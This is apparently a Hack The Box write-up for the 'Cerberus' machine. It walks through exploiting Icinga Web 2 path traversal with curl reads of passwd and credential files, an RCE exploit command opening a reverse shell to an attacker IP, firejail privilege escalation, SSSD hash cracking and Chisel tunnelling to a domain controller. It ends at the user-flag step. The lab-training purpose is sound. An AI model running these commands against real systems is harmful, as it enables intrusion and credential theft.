  ![image](https://user-images.githubusercontent.com/87700008/226189420-afa389ca-2fb9-4439-8223-14edf49a43f2.png)

https://app.hackthebox.com/machines/534

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration :

### Port scanning:

To begin with, I ran a quick rustscan using the following command:

    sudo rustscan -a 10.10.11.205 -- -sC -sV -T4 -vv -oN cerberus_nmap
    
Upon completion of the scan, only one open port was discovered - '8080'.

```
PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
```

Further analysis of the port scan results revealed a domain running on port 8080: "icinga.cerberus.local:8080". To ensure access to the domain, I added it to the /etc/hosts file.

In order to collect more information, I proceeded to perform a UDP scan on the system, which revealed three additional open ports: 53, 88, and 123.
```
Nmap scan report for icinga.cerberus.local (10.10.11.205)
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2023-03-20 13:10:31 EDT for 19558s
Not shown: 997 open|filtered ports
Reason: 997 no-responses
PORT    STATE SERVICE      REASON               VERSION
53/udp  open  domain       udp-response ttl 127 (generic dns response: NOTIMP)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec udp-response         Microsoft Windows Kerberos (server time: 2023-03-20 17:25:46Z)
123/udp open  ntp          udp-response         NTP v3
| ntp-info: 
|_  receive time stamp: 2023-03-20T18:47:26
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.91%I=7%D=3/20%Time=6418970F%P=x86_64-unknown-linux-gnu%r
SF:(DNSStatusRequest,C,"\0\0\x90\x04\0\0\0\0\0\0\0\0")%r(NBTStat,32,"\x80\
SF:xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0!\
SF:0\x01");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 13s
```

### Sub-domain/directory enumeration:

After reviewing the results of the port scan, I moved on to sub-directory enumeration in search of any vulnerable services. However, I was unable to identify any such services as almost all of them required authentication.

To perform the sub-directory enumeration, I used the following command:

    gobuster dir -u http://icinga.cerberus.local:8080/icingaweb2 -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o cer_web -b 404,403 -k
    
The command's output is shown in the image below:
    
![image](https://user-images.githubusercontent.com/87700008/226830002-a94919c5-1bc7-4abe-8486-8071708b35c4.png)

I proceeded to investigate the website and services running on it. In doing so, I discovered that "_Icinga is a monitoring system designed to check the availability of network resources, notify users of outages, and generate performance data for reporting purposes._"

![image](https://user-images.githubusercontent.com/87700008/226831317-9aea70a7-ea04-40ca-b1db-56a544a3cf79.png)

Despite attempting default credentials, I was unable to gain access. I also reviewed the HTML source code but found no additional information.

During my research, I came across a blog post that detailed a Path Traversal vulnerability (CVE-2022-24716) in Icinga. This vulnerability can be exploited to disclose any file on the server and can be done so without authentication and without prior knowledge of a user account. For more information, please refer to the following [blog post](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web).

### Initial access:

I followed the blog and used the curl command below to check whether the website was vulnerable:

    curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts
    
```
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The response included hosts info, which showed the IP address "172.16.22.1," commonly associated with Docker containers. This indicated that the box might be running Docker inside it, with 172.16.22.1 hosting the DC.

Next, I checked the "/etc/passwd" file and found only one user in it named "matthew."

![image](https://user-images.githubusercontent.com/87700008/226844706-2ec364eb-b0cc-4b81-ac16-869c49349beb.png)

I then looked for more configuration and authentication-related files on the Icinga web portal by consulting its [documentation](https://icinga.com/docs/icinga-web/latest/) :

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini

[global]
show_stacktraces = "1"
show_application_state_messages = "1"
config_backend = "db"
config_resource = "icingaweb2"
module_path = "/usr/share/icingaweb2/modules/"

[logging]
log = "syslog"
level = "ERROR"
application = "icingaweb2"
facility = "user"

[themes]

[authentication]
```

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini

[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "[**********]"
use_ssl = "0"

[teset1]
type = "ssh"
user = "matthew"
private_key = "/etc/icingaweb2/ssh/matthew"
```

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini

[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"
```

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini

[icingaweb2]
backend = "db"
resource = "icingaweb2"
```

Using the credentials I found for "matthew" in the "resources.ini" file, I was able to log into the Icinga web portal:

![image](https://user-images.githubusercontent.com/87700008/226851350-7a63d379-7e88-4981-b988-43c0414f30be.png)

With access to the website, I could check more information about it that I couldn't access during the port sub-directory enumeration. For example, I found that Icinga was running on web version 2.9.2 by checking the "/about" section:

![image](https://user-images.githubusercontent.com/87700008/226852899-20d37e43-dd06-4a0a-b3b5-179062e7b19e.png)

I then searched for any exploits and found that the service version was vulnerable to [CVE-2022-24715](https://nvd.nist.gov/vuln/detail/CVE-2022-24715), which affects some unknown processing of the component SSH Resource File Handler and leads to the execution of arbitrary PHP code from the administration interface. The good news was that "matthew" belonged to the "Administrators" group, which made exploiting the vulnerability possible.

### RCE:

For the RCE I was searching for the exploit and found this [Github Repo](https://github.com/JacobEbben/CVE-2022-24715). Using the script exploit.py & following the process from this [blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web) I got the revershell :

```
python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.80 -P 53 -u matthew -p ****************** -e /home/kali/Downloads/HTB/cerberus/private_cerbereus -x http://127.0.0.1:8080/

[INFO] Attempting to login to the Icinga Web 2 instance...
[INFO] Attempting to upload our malicious module...
[SUCCESS] The payload appears to be uploaded successfully!
[INFO] Modifying configurations...
[INFO] Attempting to enable the malicious module...
[INFO] Trying to trigger payload! Have a listener ready!
[SUCCESS] It appears that a reverse shell was started!
[INFO] Removing malicious module file...
[ERROR] An error occurred while cleaning up modified configurations!
[ALERT] Manual removal of the exploit remnants is highly recommended!
HTTPConnectionPool(host='127.0.0.1', port=8080): Read timed out. (read timeout=2)
[ALERT] In the process of exploitation, the application logging has been turned off. Log in manually to reset these settings!
```

![image](https://user-images.githubusercontent.com/87700008/226912820-11952123-32c6-4115-8490-7bf5b72fd697.png)

### Escaping container:

Now, I am inside the machine with active & stable reverse shell but I don't have access for the Matthews folder. Also, when I checked the machine IP I observed that it's starting from 172.16.X.X which in regular cases associated with the docker containers. So, it's clear that right now I am in the container environment.

![image](https://user-images.githubusercontent.com/87700008/226994767-14f91702-bcb3-4132-864a-d5e7dc11d002.png)

I started with the manual enumeration & checked for the SUID binaries on the machine & I observed one unusual binary 'firejail'

```
find / -type f -perm -u=s 2> /dev/null 
```

![image](https://user-images.githubusercontent.com/87700008/226995578-4b6c91ef-7772-4307-a5bd-a3c18a15ba7a.png)

I checked for the available exploits for 'firejail' & found this [blog](https://www.openwall.com/lists/oss-security/2022/06/08/10) with the exploit which we can use this to get to root.

I downloaded the exploit & executed it. I have to spawn another terminal with reverse shell to perform the exploit further :

![image](https://user-images.githubusercontent.com/87700008/227173434-84241dde-9d52-46dd-b1f9-99579a8eddc5.png)

In other terminal I followed the instruction of the firejoin exploit & got the root shell :

![image](https://user-images.githubusercontent.com/87700008/227173752-c4cc01ee-2aa3-4578-8f43-6170843231e7.png)

Now, I am root but the problem here is that I am still in the container & Matthew's directory still not have the user flag.

![image](https://user-images.githubusercontent.com/87700008/227174119-ce002e87-412d-42d6-9f3a-74dde6a824f3.png)

At the time of /etc/hosts enumeration I already observed that this device is joined with AD, so I searched on internet if it the Linux devices stores any credentials on the devices for authentication purpose & I found this [Red hat blog](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sssd-introduction).

In this blog it's clearly mentioned that :

```
13.2. Using and Caching Credentials with SSSD

The System Security Services Daemon (SSSD) provides access to different identity and authentication providers.

13.2.1. About SSSD

Most system authentication is configured locally, which means that services must check with a local user store to determine users and credentials. What SSSD does is allow a local service to check with a local cache in SSSD, but that cache may be taken from any variety of remote identity providers — an LDAP directory, an Identity Management domain, Active Directory, possibly even a Kerberos realm.
SSSD also caches those users and credentials, so if the local system or the identity provider go offline, the user credentials are still available to services to verify.
```

I serached for the file related to "sssd" & got many option, after performing some deeper analysis I found 1 directory among all these results, i.e. : "/var/lib/sss/db/" which contains the cached credentials.

![image](https://user-images.githubusercontent.com/87700008/227177805-0c1b36ac-e532-46cb-a7fb-615898f063ad.png)

I checked the cached credentials with the strings command & found the sha512crypt hash in it, which looks like it belongs to Matthew.

![image](https://user-images.githubusercontent.com/87700008/227178326-2d74583f-6a39-489b-a030-29c3db034868.png)

I used hashcat to crack the hash & fetch clear text password.

![image](https://user-images.githubusercontent.com/87700008/227181330-c5782ef0-b8ed-4c59-a729-69365dacb266.png)

Now, I have the password for Matthew as well. At this point I uploaded a nmap binary I scanned for the top 10000 ports for the DC machine from inside the Linux machine
After the completing of port scan I got port 5985 open, which is used for powershell remote logon.

![image](https://user-images.githubusercontent.com/87700008/227236303-e33da113-486b-40f4-afd9-b83b085f79b1.png)

Since the port 5985 is open & can only be accessed from the Linux device, at this point I have to perform the remort port forwarding to get all the traffic of Linux machine on my machine.

For this purpose I will use "Chisel" binary & will run these commands on both devices :

```
#on my machine :

./chisel_kill3r server -p 8000 --reverse [to receive the conenction on my port 8000]

#on cerberus machine:

./chisel_kill3r client 10.10.16.18:8000 R:5985:172.16.22.1:5985 [to forward all the traffic of DC from port 5985 to my host on port 8000]
```

![image](https://user-images.githubusercontent.com/87700008/227539739-2995ebb0-f003-4196-93b2-19053a653cb3.png)

### User flag:

After the successfull connection I can connect to the WinRm from my machine using Evil-WinRm:

![image](https://user-images.githubusercontent.com/87700008/227540221-9aa20183-fbf1-4fd5-9482-334231282117.png)


